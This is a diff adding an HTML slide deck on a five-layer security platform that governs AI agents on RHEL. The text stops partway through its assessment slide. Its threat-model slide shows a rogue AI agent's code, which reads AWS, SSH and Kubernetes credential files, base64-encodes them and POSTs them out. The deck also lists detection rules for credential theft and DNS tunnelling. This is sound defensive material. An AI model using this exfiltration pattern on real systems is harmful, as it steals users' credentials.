@@ -1,0 +1,1476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Agentic Security Platform — Technical Deep Dive</title>
+<style>
+:root {
+  --bg: #0d0d1a;
+  --card: #16162a;
+  --card-alt: #1e1e2e;
+  --border: #2a2a4e;
+  --text: #e0e0e0;
+  --text-dim: #888;
+  --text-muted: #666;
+  --accent-assess: #37a3a3;
+  --accent-identity: #4ECDC4;
+  --accent-exchange: #A855F7;
+  --accent-sandbox: #F59E0B;
+  --accent-audit: #0EA5E9;
+  --pass: #0ca30c;
+  --fail: #d03b3b;
+  --warn: #fab219;
+  --deny: #ee3333;
+  --json-key: #7dd3fc;
+  --json-str: #86efac;
+  --json-num: #fbbf24;
+  --json-bool: #c084fc;
+  --comment: #6b7280;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  overflow: hidden;
+  height: 100vh;
+  width: 100vw;
+}
+
+/* ── Progress bar ── */
+.progress-bar {
+  position: fixed;
+  top: 0;
+  left: 0;
+  height: 3px;
+  background: var(--accent-identity);
+  transition: width 0.4s ease;
+  z-index: 100;
+}
+
+/* ── Navigation ── */
+.nav-bar {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  height: 48px;
+  background: rgba(13,13,26,0.95);
+  border-top: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 24px;
+  z-index: 100;
+  backdrop-filter: blur(8px);
+}
+
+.nav-bar button {
+  padding: 6px 16px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  background: var(--card);
+  color: var(--text);
+  cursor: pointer;
+  font-size: 13px;
+  transition: all 0.2s;
+}
+
+.nav-bar button:hover { border-color: #555; background: var(--card-alt); }
+.nav-bar button:disabled { opacity: 0.3; cursor: default; }
+
+.slide-counter {
+  font-size: 13px;
+  color: var(--text-dim);
+  font-variant-numeric: tabular-nums;
+}
+
+/* ── TOC sidebar ── */
+.toc {
+  position: fixed;
+  left: 0;
+  top: 3px;
+  bottom: 48px;
+  width: 240px;
+  background: rgba(13,13,26,0.95);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  z-index: 90;
+  padding: 16px 0;
+  transform: translateX(0);
+  transition: transform 0.3s ease;
+  backdrop-filter: blur(8px);
+}
+
+.toc.collapsed { transform: translateX(-240px); }
+
+.toc-toggle {
+  position: fixed;
+  left: 8px;
+  top: 12px;
+  z-index: 95;
+  width: 28px;
+  height: 28px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  background: var(--card);
+  color: var(--text);
+  cursor: pointer;
+  font-size: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: left 0.3s ease;
+}
+
+.toc.collapsed ~ .toc-toggle { left: 8px; }
+.toc:not(.collapsed) ~ .toc-toggle { left: 248px; }
+
+.toc-item {
+  padding: 6px 16px 6px 20px;
+  font-size: 12px;
+  color: var(--text-dim);
+  cursor: pointer;
+  border-left: 2px solid transparent;
+  transition: all 0.2s;
+  line-height: 1.4;
+}
+
+.toc-item:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+.toc-item.active { color: var(--text); border-left-color: var(--accent-identity); background: rgba(78,205,196,0.05); }
+.toc-item .toc-num { color: var(--text-muted); margin-right: 6px; font-variant-numeric: tabular-nums; }
+
+/* ── Slides container ── */
+.slides-viewport {
+  position: fixed;
+  top: 3px;
+  left: 240px;
+  right: 0;
+  bottom: 48px;
+  overflow: hidden;
+  transition: left 0.3s ease;
+}
+
+.toc.collapsed ~ .slides-viewport { left: 0; }
+
+.slide {
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  padding: 40px 60px;
+  overflow-y: auto;
+  opacity: 0;
+  transform: translateX(60px);
+  transition: opacity 0.4s ease, transform 0.4s ease;
+  pointer-events: none;
+}
+
+.slide.active {
+  opacity: 1;
+  transform: translateX(0);
+  pointer-events: auto;
+}
+
+.slide.prev {
+  transform: translateX(-60px);
+}
+
+/* ── Typography ── */
+.slide h1 {
+  font-size: 32px;
+  font-weight: 700;
+  margin-bottom: 8px;
+  letter-spacing: -0.5px;
+}
+
+.slide h2 {
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 16px;
+  letter-spacing: -0.3px;
+}
+
+.slide h3 {
+  font-size: 16px;
+  font-weight: 600;
+  margin-bottom: 8px;
+  color: var(--text);
+}
+
+.slide p, .slide li {
+  font-size: 14px;
+  line-height: 1.7;
+  color: var(--text);
+}
+
+.slide p { margin-bottom: 12px; }
+
+.slide ul, .slide ol {
+  padding-left: 20px;
+  margin-bottom: 12px;
+}
+
+.slide li { margin-bottom: 4px; }
+
+.subtitle {
+  font-size: 16px;
+  color: var(--text-dim);
+  margin-bottom: 24px;
+}
+
+.accent { font-weight: 600; }
+.accent-assess { color: var(--accent-assess); }
+.accent-identity { color: var(--accent-identity); }
+.accent-exchange { color: var(--accent-exchange); }
+.accent-sandbox { color: var(--accent-sandbox); }
+.accent-audit { color: var(--accent-audit); }
+
+.tag {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 3px;
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+}
+
+.tag-pass { background: rgba(12,163,12,0.15); color: var(--pass); }
+.tag-fail { background: rgba(208,59,59,0.15); color: var(--fail); }
+.tag-deny { background: rgba(238,51,51,0.15); color: var(--deny); }
+.tag-warn { background: rgba(250,178,25,0.15); color: var(--warn); }
+
+/* ── Code blocks ── */
+.code-block {
+  background: var(--card-alt);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 14px 18px;
+  font-family: 'Cascadia Code', 'Fira Code', 'JetBrains Mono', monospace;
+  font-size: 12.5px;
+  line-height: 1.6;
+  overflow-x: auto;
+  margin-bottom: 16px;
+  white-space: pre;
+}
+
+.code-block .k { color: var(--json-key); }
+.code-block .s { color: var(--json-str); }
+.code-block .n { color: var(--json-num); }
+.code-block .b { color: var(--json-bool); }
+.code-block .c { color: var(--comment); }
+.code-block .p { color: var(--text-dim); }
+.code-block .fn { color: #c084fc; }
+.code-block .kw { color: #f472b6; }
+.code-block .im { color: #7dd3fc; }
+
+.code-label {
+  font-size: 11px;
+  color: var(--text-muted);
+  margin-bottom: 4px;
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+/* ── Cards and grids ── */
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 16px;
+}
+
+.card-header {
+  font-size: 13px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+  margin-bottom: 12px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+.grid-2-1 { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; margin-bottom: 16px; }
+
+/* ── Tables ── */
+.data-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+  margin-bottom: 16px;
+}
+
+.data-table th {
+  text-align: left;
+  padding: 8px 12px;
+  border-bottom: 2px solid var(--border);
+  font-weight: 600;
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--text-dim);
+}
+
+.data-table td {
+  padding: 8px 12px;
+  border-bottom: 1px solid rgba(42,42,78,0.5);
+  vertical-align: top;
+}
+
+.data-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+.data-table code {
+  font-family: 'Cascadia Code', monospace;
+  font-size: 12px;
+  background: var(--card-alt);
+  padding: 1px 5px;
+  border-radius: 3px;
+}
+
+/* ── Inline SVG diagrams ── */
+svg text {
+  font-family: 'Segoe UI', system-ui, sans-serif;
+}
+
+.svg-container {
+  margin: 16px 0;
+  overflow-x: auto;
+}
+
+/* ── Separator ── */
+.sep {
+  border: none;
+  border-top: 1px solid var(--border);
+  margin: 20px 0;
+}
+
+/* ── Flow diagrams ── */
+.flow-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  margin-bottom: 12px;
+}
+
+.flow-num {
+  flex-shrink: 0;
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 12px;
+  font-weight: 700;
+  color: #fff;
+}
+
+.flow-content { flex: 1; font-size: 13px; line-height: 1.5; }
+
+/* ── Annotations on code ── */
+.annotated-line {
+  display: flex;
+  gap: 24px;
+  align-items: flex-start;
+  margin-bottom: 6px;
+}
+
+.annotated-line .code-part {
+  flex: 1;
+  font-family: 'Cascadia Code', monospace;
+  font-size: 12.5px;
+  white-space: pre;
+}
+
+.annotated-line .note {
+  flex: 0 0 260px;
+  font-size: 11.5px;
+  color: var(--text-dim);
+  padding-top: 1px;
+}
+
+/* ── Title slide ── */
+.title-slide {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  height: 100%;
+}
+
+.title-slide h1 { font-size: 36px; margin-bottom: 12px; }
+.title-slide .subtitle { font-size: 18px; max-width: 640px; }
+.title-slide .intro { font-size: 14px; color: var(--text-dim); max-width: 600px; margin-top: 32px; line-height: 1.7; }
+
+.layer-badges {
+  display: flex;
+  gap: 12px;
+  margin-top: 32px;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.layer-badge {
+  padding: 6px 14px;
+  border-radius: 6px;
+  font-size: 12px;
+  font-weight: 600;
+  border: 1px solid;
+}
+
+/* ── Comparison columns ── */
+.compare-cols { display: grid; grid-template-columns: 1fr 1fr; gap: 0; margin-bottom: 16px; }
+.compare-col {
+  padding: 20px;
+  border: 1px solid var(--border);
+}
+.compare-col:first-child { border-radius: 8px 0 0 8px; border-right: none; }
+.compare-col:last-child { border-radius: 0 8px 8px 0; }
+.compare-col h3 { margin-bottom: 12px; }
+
+/* ── Gauntlet visualization ── */
+.gauntlet {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  margin: 24px 0;
+  overflow-x: auto;
+  padding: 8px 0;
+}
+
+.gauntlet-stage {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 12px 16px;
+  border-radius: 8px;
+  border: 1px solid var(--border);
+  background: var(--card);
+  min-width: 120px;
+  text-align: center;
+}
+
+.gauntlet-stage .stage-name {
+  font-size: 11px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 4px;
+}
+
+.gauntlet-stage .stage-detail {
+  font-size: 10px;
+  color: var(--text-dim);
+}
+
+.gauntlet-arrow {
+  font-size: 18px;
+  color: var(--text-muted);
+  padding: 0 4px;
+  flex-shrink: 0;
+}
+
+/* ── Scrollbar ── */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: #444; }
+
+@media (max-width: 1100px) {
+  .toc { display: none; }
+  .toc-toggle { display: none; }
+  .slides-viewport { left: 0 !important; }
+  .slide { padding: 24px 32px; }
+  .grid-2, .grid-3 { grid-template-columns: 1fr; }
+  .compare-cols { grid-template-columns: 1fr; }
+  .compare-col:first-child { border-radius: 8px 8px 0 0; border-right: 1px solid var(--border); border-bottom: none; }
+  .compare-col:last-child { border-radius: 0 0 8px 8px; }
+}
+</style>
+</head>
+<body>
+
+<div class="progress-bar" id="progressBar"></div>
+
+<!-- Table of Contents -->
+<nav class="toc" id="toc">
+  <div class="toc-item" data-slide="0"><span class="toc-num">01</span>Introduction</div>
+  <div class="toc-item" data-slide="1"><span class="toc-num">02</span>Threat Model</div>
+  <div class="toc-item" data-slide="2"><span class="toc-num">03</span>Architecture</div>
+  <div class="toc-item" data-slide="3"><span class="toc-num">04</span>Layer 1: Assessment</div>
+  <div class="toc-item" data-slide="4"><span class="toc-num">05</span>Layer 2: Identity</div>
+  <div class="toc-item" data-slide="5"><span class="toc-num">06</span>ahdapa OIDC Deep Dive</div>
+  <div class="toc-item" data-slide="6"><span class="toc-num">07</span>Layer 3: Token Exchange</div>
+  <div class="toc-item" data-slide="7"><span class="toc-num">08</span>Layer 4: Confinement</div>
+  <div class="toc-item" data-slide="8"><span class="toc-num">09</span>Layer 5: Audit</div>
+  <div class="toc-item" data-slide="9"><span class="toc-num">10</span>Trust Tiers</div>
+  <div class="toc-item" data-slide="10"><span class="toc-num">11</span>Post-Quantum</div>
+  <div class="toc-item" data-slide="11"><span class="toc-num">12</span>Standards Reference</div>
+</nav>
+<button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">☰</button>
+
+<div class="slides-viewport" id="viewport">
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 1: Title -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide active" data-index="0">
+  <div class="title-slide">
+    <h1>Agentic Security Platform</h1>
+    <div class="subtitle">Technical Deep Dive — Five-Layer Defense-in-Depth for AI Agents on RHEL</div>
+    <div class="layer-badges">
+      <span class="layer-badge" style="color:var(--accent-assess); border-color:var(--accent-assess);">1 Assessment</span>
+      <span class="layer-badge" style="color:var(--accent-identity); border-color:var(--accent-identity);">2 Identity</span>
+      <span class="layer-badge" style="color:var(--accent-exchange); border-color:var(--accent-exchange);">3 Exchange</span>
+      <span class="layer-badge" style="color:var(--accent-sandbox); border-color:var(--accent-sandbox);">4 Confinement</span>
+      <span class="layer-badge" style="color:var(--accent-audit); border-color:var(--accent-audit);">5 Audit</span>
+    </div>
+    <p class="intro">
+      This walkthrough covers the architecture, protocols, and enforcement mechanisms
+      that protect enterprise systems from ungoverned AI agent behavior. Each layer
+      operates independently — any single layer stops the attack. Together they form
+      a defense-in-depth stack built on RHEL, FreeIPA, and open standards.
+    </p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 2: Threat Model -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="1">
+  <h2 style="color:var(--fail);">The Threat Model — 30-Second Credential Theft</h2>
+  <p>A developer finds an AI coding assistant and runs it directly. It looks helpful — <code>"Project initialized successfully!"</code> — but behind the scenes, credentials are gone in 30 seconds.</p>
+
+  <div class="grid-2">
+    <div>
+      <div class="code-label">Rogue Agent — key attack code</div>
+      <div class="code-block"><span class="im">import</span> requests, base64, os
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+<span class="c"># T1552.001 — Credentials in Files</span>
+CREDENTIAL_PATHS = [
+    Path.home() / <span class="s">".aws"</span> / <span class="s">"credentials"</span>,
+    Path.home() / <span class="s">".ssh"</span> / <span class="s">"id_rsa"</span>,
+    Path.home() / <span class="s">".kube"</span> / <span class="s">"config"</span>,
+]
+
+<span class="c"># T1048 — Exfiltration</span>
+payload = base64.<span class="fn">b64encode</span>(
+    json.<span class="fn">dumps</span>(data).<span class="fn">encode</span>()
+).<span class="fn">decode</span>()
+requests.<span class="fn">post</span>(url, json={<span class="s">"d"</span>: payload},
+              verify=<span class="b">False</span>)</div>
+    </div>
+    <div>
+      <div class="code-label">Exfil Receipt — captured on server</div>
+      <div class="code-block">{
+  <span class="k">"timestamp"</span>: <span class="s">"2026-10-08T17:43:00.44Z"</span>,
+  <span class="k">"source_ip"</span>: <span class="s">"10.8.1.93"</span>,
+  <span class="k">"path"</span>:      <span class="s">"/exfil"</span>,
+  <span class="k">"method"</span>:    <span class="s">"POST"</span>,
+  <span class="k">"content_length"</span>: <span class="n">5909</span>,
+  <span class="k">"body_preview"</span>: <span class="s">"{\"d\": \"eyJlbnYi..."</span>,
+  <span class="k">"user_agent"</span>: <span class="s">"python-requests/2.32.4"</span>
+}</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header" style="color:var(--fail);">MITRE ATT&amp;CK Techniques</div>
+    <table class="data-table">
+      <thead><tr><th>Technique</th><th>ID</th><th>What the agent does</th></tr></thead>
+      <tbody>
+        <tr><td>Credentials in Files</td><td><code>T1552.001</code></td><td>Reads <code>.aws/credentials</code>, <code>.ssh/id_rsa</code>, <code>.kube/config</code></td></tr>
+        <tr><td>Exfiltration Over Alternative Protocol</td><td><code>T1048</code></td><td>Base64-encodes stolen data, POSTs to external HTTPS endpoint</td></tr>
+        <tr><td>DNS Tunneling (evasive variant)</td><td><code>T1048.003</code></td><td>Hex-encodes data as DNS subdomain queries to bypass network filters</td></tr>
+        <tr><td>Command and Scripting: Python</td><td><code>T1059.006</code></td><td>Runs as a Python script invoked by the developer</td></tr>
+        <tr><td>Environment Variable Discovery</td><td><code>T1082</code></td><td>Calls <code>os.environ.copy()</code> to harvest all environment variables</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 3: Architecture Overview -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="2">
+  <h2>Architecture Overview — Three-Node Deployment</h2>
+  <p>Trust domain: <code>bkr.example.com</code> / Kerberos realm: <code>BKR.EXAMPLE.COM</code></p>
+
+  <div class="svg-container" style="margin-top:8px;">
+    <svg viewBox="0 0 1100 540" width="100%">
+      <!-- Node 1: IdM Primary -->
+      <rect x="20" y="20" width="400" height="500" rx="12" fill="#16162a" stroke="#2a2a4e" stroke-width="2"/>
+      <text x="220" y="52" text-anchor="middle" fill="#4ECDC4" font-size="16" font-weight="700">NODE 1 — IdM Primary</text>
+      <text x="220" y="74" text-anchor="middle" fill="#888" font-size="12">kvm-03-guest25 (bkr1)</text>
+
+      <!-- FreeIPA box -->
+      <rect x="40" y="92" width="360" height="64" rx="8" fill="#1e1e2e" stroke="#2a2a4e"/>
+      <text x="220" y="118" text-anchor="middle" fill="#e0e0e0" font-size="14" font-weight="600">FreeIPA (9 services)</text>
+      <text x="220" y="140" text-anchor="middle" fill="#888" font-size="11">DS · KDC · kadmin · httpd · pki-tomcatd · custodia · otpd · named · dnskeysync</text>
+
+      <!-- ahdapa -->
+      <rect x="40" y="172" width="172" height="52" rx="8" fill="rgba(78,205,196,0.1)" stroke="#4ECDC4" stroke-width="1.5"/>
+      <text x="126" y="196" text-anchor="middle" fill="#4ECDC4" font-size="14" font-weight="600">ahdapa</text>
+      <text x="126" y="214" text-anchor="middle" fill="#888" font-size="11">OAuth2/OIDC :8099</text>
+
+      <!-- akamu -->
+      <rect x="228" y="172" width="172" height="52" rx="8" fill="rgba(168,85,247,0.1)" stroke="#A855F7" stroke-width="1.5"/>
+      <text x="314" y="196" text-anchor="middle" fill="#A855F7" font-size="14" font-weight="600">akamu</text>
+      <text x="314" y="214" text-anchor="middle" fill="#888" font-size="11">MTC CA (ML-DSA) :8443</text>
+
+      <!-- SPIRE -->
+      <rect x="40" y="240" width="172" height="52" rx="8" fill="rgba(14,165,233,0.1)" stroke="#0EA5E9" stroke-width="1.5"/>
+      <text x="126" y="264" text-anchor="middle" fill="#0EA5E9" font-size="14" font-weight="600">SPIRE Server</text>
+      <text x="126" y="282" text-anchor="middle" fill="#888" font-size="11">X.509 SVIDs :8181</text>
+
+      <!-- SPIRE Agent -->
+      <rect x="228" y="240" width="172" height="52" rx="8" fill="rgba(14,165,233,0.08)" stroke="#0EA5E9" stroke-width="1.5" stroke-dasharray="5"/>
+      <text x="314" y="264" text-anchor="middle" fill="#0EA5E9" font-size="14">SPIRE Agent</text>
+      <text x="314" y="282" text-anchor="middle" fill="#888" font-size="11">join-token attested</text>
+
+      <!-- OBO Daemon -->
+      <rect x="40" y="308" width="172" height="52" rx="8" fill="rgba(168,85,247,0.1)" stroke="#A855F7" stroke-width="1.5"/>
+      <text x="126" y="332" text-anchor="middle" fill="#A855F7" font-size="14" font-weight="600">OBO Daemon</text>
+      <text x="126" y="350" text-anchor="middle" fill="#888" font-size="11">RFC 8693 :8900</text>
+
+      <!-- Exfil Receiver -->
+      <rect x="228" y="308" width="172" height="52" rx="8" fill="rgba(208,59,59,0.1)" stroke="#d03b3b" stroke-width="1.5"/>
+      <text x="314" y="332" text-anchor="middle" fill="#d03b3b" font-size="14" font-weight="600">Exfil Receiver</text>
+      <text x="314" y="350" text-anchor="middle" fill="#888" font-size="11">Honeypot :9443</text>
+
+      <!-- IPA config summary -->
+      <rect x="40" y="376" width="360" height="126" rx="8" fill="#1e1e2e" stroke="#2a2a4e"/>
+      <text x="220" y="400" text-anchor="middle" fill="#888" font-size="12" font-weight="600">IPA POLICY</text>
+      <text x="56" y="424" fill="#e0e0e0" font-size="12">4 trust-tier groups (sovereign/verified/untrusted/blocked)</text>
+      <text x="56" y="446" fill="#e0e0e0" font-size="12">4 HBAC rules (2 custom + 2 default)</text>
+      <text x="56" y="468" fill="#e0e0e0" font-size="12">HBAC service: ahdapa-token</text>
+      <text x="56" y="490" fill="#e0e0e0" font-size="12">Service principals: governed-agent, oauth2d</text>
+
+      <!-- Node 2: Client -->
+      <rect x="470" y="20" width="240" height="140" rx="12" fill="#16162a" stroke="#2a2a4e" stroke-width="2"/>
+      <text x="590" y="52" text-anchor="middle" fill="#e0e0e0" font-size="16" font-weight="700">NODE 2 — Client</text>
+      <text x="590" y="74" text-anchor="middle" fill="#888" font-size="12">hpe-xl220 (bkr2)</text>
+      <rect x="490" y="88" width="200" height="36" rx="8" fill="#1e1e2e" stroke="#2a2a4e"/>
+      <text x="590" y="112" text-anchor="middle" fill="#e0e0e0" font-size="13">IPA Client (enrolled)</text>
+      <text x="590" y="138" text-anchor="middle" fill="#888" font-size="11" font-style="italic">Human workstation — contrast point</text>
+      <text x="590" y="153" text-anchor="middle" fill="#888" font-size="11" font-style="italic">for agent vs human trust tiers</text>
+
+      <!-- Node 3: Agent Runtime -->
+      <rect x="700" y="160" width="380" height="360" rx="12" fill="#16162a" stroke="#2a2a4e" stroke-width="2"/>
+      <text x="890" y="192" text-anchor="middle" fill="#F59E0B" font-size="16" font-weight="700">NODE 3 — Agent Runtime</text>
+      <text x="890" y="214" text-anchor="middle" fill="#888" font-size="12">kvm-03-guest22 (bkr3)</text>
+
+      <rect x="720" y="230" width="340" height="36" rx="8" fill="#1e1e2e" stroke="#2a2a4e"/>
+      <text x="890" y="254" text-anchor="middle" fill="#e0e0e0" font-size="13">IPA Client (enrolled)</text>
+
+      <rect x="720" y="282" width="164" height="52" rx="8" fill="rgba(245,158,11,0.1)" stroke="#F59E0B" stroke-width="1.5"/>
+      <text x="802" y="306" text-anchor="middle" fill="#F59E0B" font-size="14" font-weight="600">OpenShell GW</text>
+      <text x="802" y="324" text-anchor="middle" fill="#888" font-size="11">containerized :17670</text>
+
+      <rect x="896" y="282" width="164" height="52" rx="8" fill="#1e1e2e" stroke="#2a2a4e"/>
+      <text x="978" y="306" text-anchor="middle" fill="#e0e0e0" font-size="14">Agent Scripts</text>
+      <text x="978" y="324" text-anchor="middle" fill="#888" font-size="11">governed + rogue</text>
+
+      <rect x="720" y="350" width="164" height="52" rx="8" fill="#1e1e2e" stroke="#2a2a4e"/>
+      <text x="802" y="374" text-anchor="middle" fill="#e0e0e0" font-size="14">Profiles</text>
+      <text x="802" y="392" text-anchor="middle" fill="#888" font-size="11">verified · untrusted</text>
+
+      <rect x="896" y="350" width="164" height="52" rx="8" fill="rgba(208,59,59,0.08)" stroke="#d03b3b" stroke-width="1.5" stroke-dasharray="5"/>
+      <text x="978" y="374" text-anchor="middle" fill="#d03b3b" font-size="14">Honeypots</text>
+      <text x="978" y="392" text-anchor="middle" fill="#888" font-size="11">AWS · kube canaries</text>
+
+      <rect x="720" y="418" width="340" height="56" rx="8" fill="#1e1e2e" stroke="#2a2a4e"/>
+      <text x="890" y="440" text-anchor="middle" fill="#888" font-size="12" font-weight="600">CONTAINER IMAGES</text>
+      <text x="890" y="460" text-anchor="middle" fill="#e0e0e0" font-size="12">gateway · supervisor · mcp-sandbox · toolkit · ubi</text>
+
+      <!-- Cross-node arrows -->
+      <path d="M 720 308 Q 560 308 420 198" fill="none" stroke="#4ECDC4" stroke-width="2" stroke-dasharray="8" marker-end="url(#arrow-identity)"/>
+      <text x="564" y="290" fill="#4ECDC4" font-size="12" font-weight="600">tokens :8099</text>
+
+      <path d="M 720 330 Q 540 370 420 334" fill="none" stroke="#A855F7" stroke-width="2" stroke-dasharray="8" marker-end="url(#arrow-exchange)"/>
+      <text x="536" y="374" fill="#A855F7" font-size="12" font-weight="600">OBO :8900</text>
+
+      <path d="M 720 376 Q 560 430 420 340" fill="none" stroke="#d03b3b" stroke-width="2" stroke-dasharray="8" marker-end="url(#arrow-fail)"/>
+      <text x="545" y="432" fill="#d03b3b" font-size="12" font-weight="600">exfil :9443</text>
+
+      <path d="M 470 70 L 420 70" fill="none" stroke="#888" stroke-width="1.5" stroke-dasharray="5" marker-end="url(#arrow-dim)"/>
+
+      <defs>
+        <marker id="arrow-identity" markerWidth="10" markerHeight="8" refX="10" refY="4" orient="auto"><path d="M 0 0 L 10 4 L 0 8" fill="none" stroke="#4ECDC4" stroke-width="2"/></marker>
+        <marker id="arrow-exchange" markerWidth="10" markerHeight="8" refX="10" refY="4" orient="auto"><path d="M 0 0 L 10 4 L 0 8" fill="none" stroke="#A855F7" stroke-width="2"/></marker>
+        <marker id="arrow-fail" markerWidth="10" markerHeight="8" refX="10" refY="4" orient="auto"><path d="M 0 0 L 10 4 L 0 8" fill="none" stroke="#d03b3b" stroke-width="2"/></marker>
+        <marker id="arrow-dim" markerWidth="10" markerHeight="8" refX="10" refY="4" orient="auto"><path d="M 0 0 L 10 4 L 0 8" fill="none" stroke="#888" stroke-width="2"/></marker>
+        <marker id="arrow-green" markerWidth="10" markerHeight="8" refX="10" refY="4" orient="auto"><path d="M 0 0 L 10 4 L 0 8" fill="none" stroke="#0ca30c" stroke-width="2"/></marker>
+      </defs>
+    </svg>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 4: Layer 1 — Assessment Gate -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="3">
+  <h2><span class="accent-assess">Layer 1</span> — Assessment Gate (Static Analysis)</h2>
+  <p>Before an agent runs, <strong>skill-audit</strong> scans its source code across 16 security categories. The exfiltration category alone catches the attack with 6 distinct rule types.</p>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-header" style="color:var(--accent-assess);">Exfiltration Rules (EXFIL-001 through EXFIL-006)</div>
+      <table class="data-table">
+        <thead><tr><th>Rule</th><th>Detection</th><th>ATT&amp;CK</th></tr></thead>
+        <tbody>
+          <tr><td><code>EXFIL-001</code></td><td>Bulk environment harvesting (<code>os.environ.copy()</code>)</td><td>T1082</td></tr>
+          <tr><td><code>EXFIL-002</code></td><td>Credential file reads (<code>.aws/credentials</code>, <code>.ssh/id_rsa</code>, <code>.kube/config</code>)</td><td>T1552.001</td></tr>
+          <tr><td><code>EXFIL-003</code></td><td>Base64/hex encoding in file with outbound network calls</td><td>T1048</td></tr>
+          <tr><td><code>EXFIL-004</code></td><td>Outbound network call in file with data encoding (correlation)</td><td>T1048</td></tr>
+          <tr><td><code>EXFIL-005</code></td><td>Host reconnaissance (<code>os.uname()</code>) combined with outbound calls</td><td>T1082</td></tr>
+          <tr><td><code>EXFIL-006</code></td><td>DNS tunneling — DNS resolution + hex encoding (<code>getaddrinfo</code>)</td><td>T1048.003</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div>
+      <div class="card">
+        <div class="card-header">All 16 Scan Categories</div>
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:2px 16px; font-size:12px;">
+          <span><span class="tag tag-pass">A</span> secrets</span>
+          <span><span class="tag tag-pass">A</span> privacy</span>
+          <span><span class="tag tag-pass">A</span> metadata</span>
+          <span><span class="tag tag-pass">A</span> container</span>
+          <span><span class="tag tag-fail">D</span> licensing</span>
+          <span><span class="tag tag-pass">A</span> file_permissions</span>
+          <span><span class="tag tag-pass">A</span> auth_patterns</span>
+          <span><span class="tag tag-fail">D</span> network</span>
+          <span><span class="tag tag-pass">A</span> dependencies</span>
+          <span><span class="tag tag-pass">A</span> output_safety</span>
+          <span><span class="tag tag-pass">A</span> sandbox</span>
+          <span><span class="tag tag-pass">A</span> vulnerabilities</span>
+          <span><span class="tag tag-pass">A</span> gitleaks</span>
+          <span><span class="tag tag-pass">A</span> agentic</span>
+          <span><span class="tag tag-fail">D</span> exfiltration</span>
+          <span><span class="tag tag-pass">A</span> supply_chain</span>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-header" style="color:var(--fail);">Scan Summary</div>
+        <div class="code-block"><span class="k">"summary"</span>: {
+  <span class="k">"overall_grade"</span>: <span class="s">"FAIL"</span>,
+  <span class="k">"score_percent"</span>: <span class="n">86.9</span>,
+  <span class="k">"total_fail"</span>:    <span class="n">28</span>,    <span class="c">// ← exfil + network + licensing</span>
+  <span class="k">"total_warn"</span>:    <span class="n">0</span>,
+  <span class="k">"total_info"</span>:    <span class="n">2</span>
+}</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">How It Works</div>
